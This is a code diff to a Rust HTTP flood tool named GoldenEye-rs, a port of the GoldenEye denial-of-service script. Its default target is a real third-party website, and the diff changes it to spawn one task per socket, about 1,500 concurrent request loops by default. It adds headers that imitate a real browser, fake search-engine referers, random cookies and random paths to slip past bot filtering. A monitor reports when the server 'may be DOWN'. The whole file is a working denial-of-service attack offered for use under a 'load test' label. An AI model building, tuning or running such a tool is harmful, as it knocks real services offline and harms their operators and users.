@@ -2,8 +2,11 @@ use clap::Parser;
 use rand::prelude::*;
 use rand::{Rng, SeedableRng};
 use rand_chacha::ChaCha8Rng; // or ChaCha20Rng/StdRng
-use reqwest::header::{HeaderMap, HeaderName, HeaderValue, CONNECTION, HOST, USER_AGENT};
-use std::collections::VecDeque;
+use reqwest::header::{
+    HeaderMap, HeaderName, HeaderValue, ACCEPT, ACCEPT_ENCODING, ACCEPT_LANGUAGE, CONNECTION,
+    CONTENT_TYPE, HOST, REFERER, USER_AGENT,
+};
+use reqwest::{Client, Proxy};
 use std::io::{BufRead, BufReader};
 use std::sync::{
     atomic::{AtomicBool, AtomicUsize, Ordering},
@@ -14,6 +17,9 @@ use tokio::signal;
 use tokio::task::JoinHandle;
 use tokio::time::sleep;
 
+// Enable multipart support (requires adding the "multipart" feature in Cargo.toml)
+use reqwest::multipart;
+
 const DEFAULT_WORKERS: usize = 300;
 const DEFAULT_SOCKETS: usize = 5;
 
@@ -21,7 +27,7 @@ const METHOD_GET: &str = "get";
 const METHOD_POST: &str = "post";
 const METHOD_RAND: &str = "random";
 const DEFAULT_WEBSITE: &str = "https://www.project2025.org/";
-/// (Similar functionality to the Python GoldenEye script.)
+
 #[derive(Parser, Debug)]
 #[command(author, version, about)]
 struct Cli {
@@ -29,11 +35,11 @@ struct Cli {
     #[arg(default_value_t = DEFAULT_WEBSITE.to_string())]
     url: String,
 
-    /// Number of concurrent "worker tasks"
+    /// Number of worker “groups”
     #[arg(short = 'w', long = "workers", default_value_t = DEFAULT_WORKERS)]
     workers: usize,
 
-    /// Number of concurrent requests (connections) per worker
+    /// Number of concurrent sockets per worker
     #[arg(short = 's', long = "sockets", default_value_t = DEFAULT_SOCKETS)]
     sockets: usize,
 
@@ -62,7 +68,7 @@ struct RandomDataGenerator {
 
 impl RandomDataGenerator {
     fn new(user_agents: Arc<Vec<String>>) -> Self {
-        // For demonstration, we seed with random data from the OS:
+        // Seed with random data from the OS
         let seed: [u8; 32] = rand::random();
         let rng = ChaCha8Rng::from_seed(seed);
         Self { user_agents, rng }
@@ -73,9 +79,6 @@ impl RandomDataGenerator {
         const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ\
                                  abcdefghijklmnopqrstuvwxyz\
                                  0123456789";
-
-        // We'll pick the range beforehand to avoid multiple borrows of `self.rng`.
-        // Then we produce that many chars.
         let mut output = String::with_capacity(size);
         for _ in 0..size {
             let idx = self.rng.gen_range(0..CHARSET.len());
@@ -114,13 +117,10 @@ impl RandomDataGenerator {
     fn generate_query_string(&mut self, pairs: usize) -> String {
         let mut output = String::new();
         for i in 0..pairs {
-            // Precompute sizes to avoid borrowing self.rng multiple times
             let key_size = self.rng.gen_range(3..11);
             let val_size = self.rng.gen_range(3..21);
-
             let key = self.build_block(key_size);
             let val = self.build_block(val_size);
-
             output.push_str(&key);
             output.push('=');
             output.push_str(&val);
@@ -132,7 +132,173 @@ impl RandomDataGenerator {
     }
 }
 
-/// Holds shared state for the load test.
+/// Chooses a realistic path – sometimes using a common endpoint.
+fn random_path(data_gen: &mut RandomDataGenerator, base_path: &str) -> String {
+    let common_paths = [
+        "/", "/index.html", "/home", "/login", "/dashboard", "/api/data", "/products", "/contact", "/about",
+    ];
+    if data_gen.rng.gen_bool(0.3) {
+        let idx = data_gen.rng.gen_range(0..common_paths.len());
+        common_paths[idx].to_string()
+    } else if base_path.is_empty() {
+        "/".to_string()
+    } else {
+        base_path.to_string()
+    }
+}
+
+/// Randomly build a “Cookie” header value.
+fn build_cookie_header(data_gen: &mut RandomDataGenerator) -> Option<HeaderValue> {
+    if data_gen.rng.gen_bool(0.5) {
+        let num_cookies = data_gen.rng.gen_range(1..5);
+        let mut cookies = Vec::new();
+        for _ in 0..num_cookies {
+            let name_len = data_gen.rng.gen_range(3..10);
+            let name = data_gen.build_block(name_len);
+            let value_len = data_gen.rng.gen_range(5..15);
+            let value = data_gen.build_block(value_len);
+            cookies.push(format!("{}={}", name, value));
+        }
+        let cookie_str = cookies.join("; ");
+        if let Ok(hv) = HeaderValue::from_str(&cookie_str) {
+            return Some(hv);
+        }
+    }
+    None
+}
+
+/// Build random headers for each request, trying to look more like a real browser.
+/// The `is_post` flag lets us add (or omit) headers like Content-Type.
+fn build_headers(data_gen: &mut RandomDataGenerator, host: &str, is_post: bool) -> HeaderMap {
+    let mut headers = HeaderMap::new();
+
+    // 1) Standard “browser-like” headers:
+    headers.insert(
+        ACCEPT,
+        HeaderValue::from_static("text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"),
+    );
+    headers.insert(
+        ACCEPT_LANGUAGE,
+        HeaderValue::from_static("en-US,en;q=0.9"),
+    );
+    // Randomize Accept-Encoding
+    let enc_opts = ["gzip", "deflate", "br", "identity"];
+    let mut shuffle_enc = enc_opts.to_vec();
+    shuffle_enc.shuffle(&mut data_gen.rng);
+    let ecount = data_gen.rng.gen_range(1..=shuffle_enc.len());
+    let chosen_enc = &shuffle_enc[0..ecount];
+    let accept_encoding = chosen_enc.join(", ");
+    if let Ok(hv) = HeaderValue::from_str(&accept_encoding) {
+        headers.insert(ACCEPT_ENCODING, hv);
+    }
+
+    // 2) Sec-Fetch-* headers:
+    headers.insert(
+        HeaderName::from_static("sec-fetch-site"),
+        HeaderValue::from_static("none"),
+    );
+    headers.insert(
+        HeaderName::from_static("sec-fetch-mode"),
+        HeaderValue::from_static("navigate"),
+    );
+    headers.insert(
+        HeaderName::from_static("sec-fetch-user"),
+        HeaderValue::from_static("?1"),
+    );
+    headers.insert(
+        HeaderName::from_static("sec-fetch-dest"),
+        HeaderValue::from_static("document"),
+    );
+
+    // 3) Upgrade-Insecure-Requests:
+    headers.insert(
+        HeaderName::from_static("upgrade-insecure-requests"),
+        HeaderValue::from_static("1"),
+    );
+
+    // 4) Sec-CH-UA headers:
+    if let Ok(hv) = HeaderValue::from_str("\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"99\"") {
+        headers.insert(HeaderName::from_static("sec-ch-ua"), hv);
+    }
+    if let Ok(hv) = HeaderValue::from_str("?0") {
+        headers.insert(HeaderName::from_static("sec-ch-ua-mobile"), hv);
+    }
+
+    // 5) User-Agent:
+    let user_agent = data_gen.get_user_agent();
+    if let Ok(hv) = HeaderValue::from_str(&user_agent) {
+        headers.insert(USER_AGENT, hv);
+    } else {
+        headers.insert(USER_AGENT, HeaderValue::from_static("Mozilla/5.0"));
+    }
+
+    // 6) Host and Connection:
+    if let Ok(hv) = HeaderValue::from_str(host) {
+        headers.insert(HOST, hv);
+    } else {
+        headers.insert(HOST, HeaderValue::from_static("invalid.host"));
+    }
+    headers.insert(CONNECTION, HeaderValue::from_static("keep-alive"));
+
+    // 7) Optional Referer:
+    if data_gen.rng.gen_bool(0.5) {
+        let ref_opts = [
+            "https://www.google.com/",
+            "https://www.bing.com/",
+            "https://www.baidu.com/",
+            "https://www.yandex.com/",
+            &format!("https://{}/", host),
+        ];
+        let idx = data_gen.rng.gen_range(0..ref_opts.len());
+        let mut referer = ref_opts[idx].to_string();
+        if data_gen.rng.gen_bool(0.5) {
+            let pairs = data_gen.rng.gen_range(1..6);
+            let q = data_gen.generate_query_string(pairs);
+            referer.push('?');
+            referer.push_str(&q);
+        }
+        if let Ok(hv) = HeaderValue::from_str(&referer) {
+            headers.insert(REFERER, hv);
+        }
+    }
+
+    // 8) For POST requests, optionally add Content-Type and Cookies.
+    if is_post {
+        let use_multipart = data_gen.rng.gen_bool(0.5);
+        if !use_multipart {
+            headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/x-www-form-urlencoded"));
+        }
+        if let Some(cookie) = build_cookie_header(data_gen) {
+            headers.insert("cookie", cookie);
+        }
+    } else if data_gen.rng.gen_bool(0.3) {
+        if let Some(cookie) = build_cookie_header(data_gen) {
+            headers.insert("cookie", cookie);
+        }
+    }
+
+    // 9) Cache-Control:
+    let cache_opts = ["no-cache", "max-age=0"];
+    let cc_idx = data_gen.rng.gen_range(0..cache_opts.len());
+    if let Ok(hv) = HeaderValue::from_str(cache_opts[cc_idx]) {
+        headers.insert(HeaderName::from_static("cache-control"), hv);
+    }
+
+    // 10) Global Privacy Control:
+    headers.insert(
+        HeaderName::from_static("sec-gpc"),
+        HeaderValue::from_static("1"),
+    );
+
+    // 11) Optionally add DNT:
+    if data_gen.rng.gen_bool(0.5) {
+        headers.insert("dnt", HeaderValue::from_static("1"));
+    }
+
+    headers
+}
+
+/// Shared state for the load test.
 struct LoadTestState {
     success_count: AtomicUsize,
     fail_count: AtomicUsize,
@@ -147,9 +313,7 @@ impl LoadTestState {
             running: AtomicBool::new(true),
         }
     }
-    fn reset(&self){
-        self.success_count.store(0, Ordering::Relaxed);
-    }
+
     fn inc_success(&self) {
         self.success_count.fetch_add(1, Ordering::Relaxed);
     }
@@ -167,137 +331,16 @@ impl LoadTestState {
     }
 }
 
-/// Build random headers for each request.
-fn build_headers(data_gen: &mut RandomDataGenerator, host: &str) -> HeaderMap {
-    let mut headers = HeaderMap::new();
-
-    let user_agent = data_gen.get_user_agent();
-    //     headers.insert(
-    //     HeaderName::from_static("x-forwarded-for"),
-    //     HeaderValue::from_static("8.8.8.8"),
-    // );
-    match HeaderValue::from_str(&user_agent) {
-        Ok(hv) => {
-            headers.insert(USER_AGENT, hv);
-  }
-        Err(_) => {
-            // Fallback if invalid
-            headers.insert(USER_AGENT, HeaderValue::from_static("Mozilla/5.0"));
-        }
-    }
-
-    headers.insert(CONNECTION, HeaderValue::from_static("keep-alive"));
-
-    match HeaderValue::from_str(host) {
-        Ok(hv) => {
-            headers.insert(HOST, hv);
-        }
-        Err(_) => {
-            headers.insert(HOST, HeaderValue::from_static("invalid.host"));
-        }
-    }
-
-    // Optional random accept-charset
-    if data_gen.rng.gen_bool(0.5) {
-        let charset_choices = ["ISO-8859-1", "utf-8", "Windows-1251", "ISO-8859-2"];
-        let c1_idx = data_gen.rng.gen_range(0..charset_choices.len());
-        let c2_idx = data_gen.rng.gen_range(0..charset_choices.len());
-        let c1 = charset_choices[c1_idx];
-        let c2 = charset_choices[c2_idx];
-
-        let q1 = data_gen.rng.gen_range(1..10);
-        let q2 = data_gen.rng.gen_range(1..10);
-        let accept_charset = format!("{},{};q=0.{};*;q=0.{}", c1, c2, q1, q2);
-
-        if let Ok(hv) = HeaderValue::from_str(&accept_charset) {
-            headers.insert(HeaderName::from_static("accept-charset"), hv);
-        }
-    }
-
-    // Optional referer
-    if data_gen.rng.gen_bool(0.5) {
-        let ref_opts = [
-            "http://www.google.com/",
-            "http://www.bing.com/",
-            "http://www.baidu.com/",
-            "http://www.yandex.com/",
-            &format!("http://{}/", host),
-        ];
-        let idx = data_gen.rng.gen_range(0..ref_opts.len());
-        let mut referer = ref_opts[idx].to_string();
-
-        if data_gen.rng.gen_bool(0.5) {
-            let pairs = data_gen.rng.gen_range(1..6);
-            let q = data_gen.generate_query_string(pairs);
-            referer.push('?');
-            referer.push_str(&q);
-        }
-
-        if let Ok(hv) = HeaderValue::from_str(&referer) {
-            headers.insert(HeaderName::from_static("referer"), hv);
-        }
-    }
-
-    // Optional content-type
-    if data_gen.rng.gen_bool(0.5) {
-        let ct = if data_gen.rng.gen_bool(0.5) {
-            "multipart/form-data"
-        } else {
-            "application/x-url-encoded"
-        };
-        headers.insert(HeaderName::from_static("content-type"), HeaderValue::from_static(ct));
-    }
-
-    // Optional cookie
-    if data_gen.rng.gen_bool(0.5) {
-        let pairs = data_gen.rng.gen_range(1..6);
-        let cookie_str = data_gen.generate_query_string(pairs);
-        if let Ok(hv) = HeaderValue::from_str(&cookie_str) {
-            headers.insert(HeaderName::from_static("cookie"), hv);
-        }
-    }
-
-    // Random cache-control
-    let cache_opts = ["no-cache", "max-age=0"];
-    let n_cache = data_gen.rng.gen_range(1..=cache_opts.len());
-    let mut used = VecDeque::from(cache_opts);
-    let mut cc_vec = vec![];
-    for _ in 0..n_cache {
-        if let Some(item) = used.pop_front() {  
-            cc_vec.push(item);
-        }
-    }
-    let cache_control = cc_vec.join(", ");
-
-    if let Ok(hv) = HeaderValue::from_str(&cache_control) {
-        headers.insert(HeaderName::from_static("cache-control"), hv);
-    }
-
-    // Accept-Encoding
-    let enc_opts = ["gzip", "deflate", "identity", "*"];
-    let mut shuffle_enc = enc_opts.to_vec();
-    shuffle_enc.shuffle(&mut data_gen.rng);
-    let ecount = data_gen.rng.gen_range(1..=shuffle_enc.len());
-    let chosen_enc = &shuffle_enc[0..ecount];
-    let accept_encoding = chosen_enc.join(", ");
-
-    if let Ok(hv) = HeaderValue::from_str(&accept_encoding) {
-        headers.insert(HeaderName::from_static("accept-encoding"), hv);
-    }
-
-    headers
-}
-
-/// Each worker spawns multiple "connections" in an infinite loop, making requests.
-async fn worker_task(
+/// Each socket task continuously sends requests.
+async fn socket_task(
     client: reqwest::Client,
     url: String,
-    sockets: usize,
     method: String,
     state: Arc<LoadTestState>,
     mut data_gen: RandomDataGenerator,
     debug: bool,
 ) {
+    // Parse URL details.
     let parsed = match reqwest::Url::parse(&url) {
         Ok(p) => p,
         Err(e) => {
@@ -305,83 +348,105 @@ async fn worker_task(
             return;
         }
     };
-    let host = parsed
-        .host_str()
-        .unwrap_or("localhost")
-        .to_string();
-    let port = parsed.port_or_known_default().unwrap_or(80);
 
+    let port = parsed.port_or_known_default().unwrap_or_else(|| {
+        if parsed.scheme() == "https" { 443 } else { 80 }
+    });
+    let host = parsed.host_str().unwrap_or("localhost").to_string();
+    let scheme = parsed.scheme();
+
+    // Loop indefinitely until state signals to stop.
     while state.is_running() {
-        // For each "connection"
-        for _ in 0..sockets {
-            let chosen_method = if method == METHOD_RAND {
-                if data_gen.rng.gen_bool(0.5) {
-                    METHOD_GET
-                } else {
-                    METHOD_POST
-                }
+        let chosen_method = if method == METHOD_RAND {
+            if data_gen.rng.gen_bool(0.5) {
+                METHOD_GET
             } else {
-                &method
-            };
+                METHOD_POST
+            }
+        } else {
+            method.as_str()
+        };
+        let is_post = chosen_method == METHOD_POST;
+        let base_path = parsed.path().trim();
+        let final_path = random_path(&mut data_gen, if base_path.is_empty() { "/" } else { base_path });
+        let headers = build_headers(&mut data_gen, &host, is_post);
 
-            // Build random path with query
-            let base_path = parsed.path().trim();
-            let joiner = if base_path.contains('?') { '&' } else { '?' };
-
+        if chosen_method == METHOD_GET {
+            // Build GET URL with random query parameters.
             let pairs_count = data_gen.rng.gen_range(1..6);
             let q_string = data_gen.generate_query_string(pairs_count);
-
-            // Construct final request URL
-            let final_path = if base_path.is_empty() { "/" } else { base_path };
+            let joiner = if final_path.contains('?') { '&' } else { '?' };
             let req_url = format!(
                 "{}://{}:{}{}{}{}",
-                parsed.scheme(),
-                host,
-                port,
-                final_path,
-                joiner,
-                q_string
+                scheme, host, port, final_path, joiner, q_string
             );
-
-            // Build random headers
-            let headers = build_headers(&mut data_gen, &host);
-
-            let req_builder = match chosen_method {
-                METHOD_GET => client.get(&req_url),
-                METHOD_POST => client.post(&req_url),
-                _ => client.get(&req_url), // fallback
-            }
-            .headers(headers);
-
-            let result = req_builder.send().await;
-            match result {
+            let req_builder = client.get(&req_url).headers(headers);
+            match req_builder.send().await {
                 Ok(response) => {
-                    // Attempt to consume body for completeness (optional)
-                    if let Err(e) = response.bytes().await {
-                        if debug {
-                            eprintln!("[DEBUG] Response body read error: {e}");
-                        }
-                        state.inc_fail();
-                        continue;
-                    }
+                    let _ = response.bytes().await;
                     state.inc_success();
                 }
                 Err(e) => {
                     if debug {
-                        eprintln!("[DEBUG] Request error: {e}");
+                        eprintln!("[DEBUG] GET error: {e}");
                     }
                     state.inc_fail();
+                }
+            }
+        } else {
+            // POST request without query parameters in the URL.
+            let req_url = format!("{}://{}:{}{}", scheme, host, port, final_path);
+            let req_builder = client.post(&req_url).headers(headers);
+            if data_gen.rng.gen_bool(0.5) {
+                // Multipart/form-data POST.
+                let num_fields = data_gen.rng.gen_range(1..6);
+                let mut form = multipart::Form::new();
+                for _ in 0..num_fields {
+                    let name_len = data_gen.rng.gen_range(3..10);
+                    let field_name = data_gen.build_block(name_len);
+                    let value_len = data_gen.rng.gen_range(5..15);
+                    let field_value = data_gen.build_block(value_len);
+                    form = form.text(field_name, field_value);
+                }
+                match req_builder.multipart(form).send().await {
+                    Ok(response) => {
+                        let _ = response.bytes().await;
+                        state.inc_success();
+                    }
+                    Err(e) => {
+                        if debug {
+                            eprintln!("[DEBUG] Multipart POST error: {e}");
+                        }
+                        state.inc_fail();
+                    }
+                }
+            } else {
+                // URL-encoded POST.
+                let num_pairs = data_gen.rng.gen_range(1..6);
+                let body = data_gen.generate_query_string(num_pairs);
+                match req_builder.body(body).send().await {
+                    Ok(response) => {
+                        let _ = response.bytes().await;
+                        state.inc_success();
+                    }
+                    Err(e) => {
+                        if debug {
+                            eprintln!("[DEBUG] POST error: {e}");
+                        }
+                        state.inc_fail();
+                    }
                 }
             }
         }
     }
 }
 
-/// Main monitor that prints stats while tasks run. Stops on Ctrl+C or when tasks finish.
+/// Monitor task prints out status every few seconds and stops on Ctrl+C.
 async fn monitor_state(state: Arc<LoadTestState>, debug: bool) {
     let mut last_success = 0;
     let mut last_fail = 0;
     let mut avg = 0.0;
+
     loop {
         tokio::select! {
             _ = signal::ctrl_c() => {
@@ -392,18 +457,16 @@ async fn monitor_state(state: Arc<LoadTestState>, debug: bool) {
             _ = sleep(Duration::from_secs(3)) => {
                 let s = state.success_count.load(Ordering::Relaxed);
                 let f = state.fail_count.load(Ordering::Relaxed);
-                if avg == 0.0 {
-                    avg = state.success_count.load(Ordering::Relaxed) as f64
-                }
-                avg = ((avg + state.success_count.load(Ordering::Relaxed) as f64) / 2.0).floor();
+                avg = if avg == 0.0 { s as f64 } else { ((avg + s as f64) / 2.0).floor() };
 
                 print!("[+] Hits: {s} | Fails: {f}, Avg: {avg}");
+                // Reset counter for next interval.
                 state.success_count.store(0, Ordering::Relaxed);
+
                 if s > 0 && f > 0 && s == last_success && f > last_fail {
                     print!(" => Server may be DOWN!");
                 }
                 println!();
-
                 last_success = s;
                 last_fail = f;
             }
@@ -413,7 +476,6 @@ async fn monitor_state(state: Arc<LoadTestState>, debug: bool) {
         }
     }
 
-    // Final stats
     let final_s = state.success_count.load(Ordering::Relaxed);
     let final_f = state.fail_count.load(Ordering::Relaxed);
     println!("[+] Final Hits: {final_s} | Final Fails: {final_f}");
@@ -425,46 +487,43 @@ async fn monitor_state(state: Arc<LoadTestState>, debug: bool) {
 #[tokio::main]
 async fn main() {
     let cli = Cli::parse();
-    // Basic banner
-    println!("\nGoldenEye-rs - Rust Implementation");
-    println!("----------------------------------");
 
+    println!("\nGoldenEye-rs - Maximized Throughput Mode");
+    println!("-----------------------------------------");
     println!("Target: {}", cli.url);
-
     println!(
         "Mode: '{}' | Workers: {} | Sockets/Worker: {}",
         cli.method, cli.workers, cli.sockets
     );
     println!("Press Ctrl+C to stop.\n");
 
-    // Load user-agents if provided
+    // Load user agents if provided.
     let mut user_agents_vec = Vec::new();
     if let Some(path) = &cli.useragents {
-        match std::fs::File::open(path) {
-            Ok(file) => {
-                let reader = BufReader::new(file);
-                for line in reader.lines().flatten() {
-                    let trimmed = line.trim().to_string();
-                    if !trimmed.is_empty() {
-                        user_agents_vec.push(trimmed);
-                    }
+        if let Ok(file) = std::fs::File::open(path) {
+            let reader = BufReader::new(file);
+            for line in reader.lines().flatten() {
+                let trimmed = line.trim().to_string();
+                if !trimmed.is_empty() {
+                    user_agents_vec.push(trimmed);
                 }
             }
-            Err(e) => {
-                eprintln!("[!] Could not read useragents file: {e}");
-            }
+        } else {
+            eprintln!("[!] Could not read useragents file.");
         }
     }
     let user_agents_arc = Arc::new(user_agents_vec);
 
-    // Build global state
+    // Global state.
     let state = Arc::new(LoadTestState::new());
     let mut tasks: Vec<JoinHandle<()>> = Vec::new();
 
-    // Build the reqwest client
-    let mut client_builder = reqwest::Client::builder();
+    // Tune the reqwest client for high concurrency.
+    let mut client_builder = reqwest::Client::builder()
+        .tcp_keepalive(Some(Duration::from_secs(90)))
+        .pool_idle_timeout(Duration::from_secs(90))
+        .pool_max_idle_per_host(1000);
     if cli.nosslcheck {
-        // Danger: Accept invalid certs
         client_builder = client_builder.danger_accept_invalid_certs(true);
     }
     let client = match client_builder.build() {
@@ -475,43 +534,33 @@ async fn main() {
         }
     };
 
-    // Launch workers
-    for _ in 0..cli.workers {
-        let w_client = client.clone();
-        let w_state = Arc::clone(&state);
-        let w_url = cli.url.clone();
-        let w_method = cli.method.clone();
-        let debug = cli.debug;
-
-        // Each worker has its own data generator (with its own RNG).
-        let worker_data_gen = RandomDataGenerator::new(Arc::clone(&user_agents_arc));
-
-        let handle = tokio::spawn(async move {
-            worker_task(
-                w_client,
-                w_url,
-                cli.sockets,
-                w_method,
-                w_state,
-                worker_data_gen,
-                debug
-            ).await;
-        });
-        tasks.push(handle);
+    // Instead of "workers" with an inner sockets loop, spawn one task per socket.
+    let total_tasks = cli.workers * cli.sockets;
+    for _ in 0..total_tasks {
+        let task_client = client.clone();
+        let task_state = Arc::clone(&state);
+        let task_url = cli.url.clone();
+        let task_method = cli.method.clone();
+        let task_debug = cli.debug;
+        let task_data_gen = RandomDataGenerator::new(Arc::clone(&user_agents_arc));
+        tasks.push(tokio::spawn(socket_task(
+            task_client,
+            task_url,
+            task_method,
+            task_state,
+            task_data_gen,
+            task_debug,
+        )));
     }
 
-    // Monitor stats in a separate task
+    // Spawn the monitor task.
     let monitor_handle = {
         let st = Arc::clone(&state);
         let dbg = cli.debug;
-        tokio::spawn(async move {
-            monitor_state(st, dbg).await;
-        })
+        tokio::spawn(async move { monitor_state(st, dbg).await })
     };
 
-    // Wait for all tasks to finish
-    // The monitor task will break on Ctrl+C and call `state.stop()`,
-    // eventually letting worker tasks exit their loop
+    // Wait for all tasks (they will only stop after Ctrl+C).
     for t in tasks {
         let _ = t.await;
     }
